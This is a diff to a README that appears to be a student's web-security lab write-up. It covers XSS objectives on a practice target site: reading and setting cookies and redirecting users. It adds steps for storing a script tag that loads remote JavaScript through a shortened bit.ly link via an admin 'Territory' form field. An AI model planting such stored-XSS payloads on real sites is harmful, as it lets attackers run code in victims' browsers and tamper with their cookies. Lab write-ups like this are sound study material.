@@ -129,7 +129,7 @@ See the code for the page <a href="./html/index.html">here</a>
 ## Bonus Objective 2:
 ### Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data.
 - Read the cookie data as demonstrated in Green Vulnerability #2: Cross-Site Scripting (XSS)
-- Can't demonstrate redirect because the Green target page "Feedback" already redirects to another page.  
+- Can't demonstrate redirect because the Green target's page "Feedback" already redirects to another page.  
 Redirects are done through
 ```javascript
     document.location = "URL"
@@ -137,6 +137,24 @@ Redirects are done through
 - Set cookie <br />  
 ![GIF Walkthrough](./img/Bonus_set_cookie.gif)<br />
 
+## Advanced Objective:
+### Set cookie using XSS
+- Can't demonstrate "Set cookie using XSS" through the "Feedback" page because the Green target's "Feedback" page already redirects to another page.  
+- Demonstrated using XSS in the "Add a Teritory" page.<br />  
+![GIF Walkthrough](./img/Advanced.gif)<br />  
+    Steps to recreate:
+- When logged in as an admin go to "Countries, States, & Territories".
+- Click on "Show", doesn't matter which country.
+- Click on "Add a State".
+- Enter values for "Name" and "Code" and click create.
+- Click on "Add a Territory".
+- Ender a value for "Name".
+- In the filed "Position" type:
+  ```html
+        <script src="https://bit.ly/2z3GhIf"></script>
+  ```  
+  https://bit.ly/2z3GhIf is a shortened link for a <a href="./js_scripts/newScript.js">js script</a> hosted on GoogeDrive
+- The cookie is changed
 
 
 ## Notes
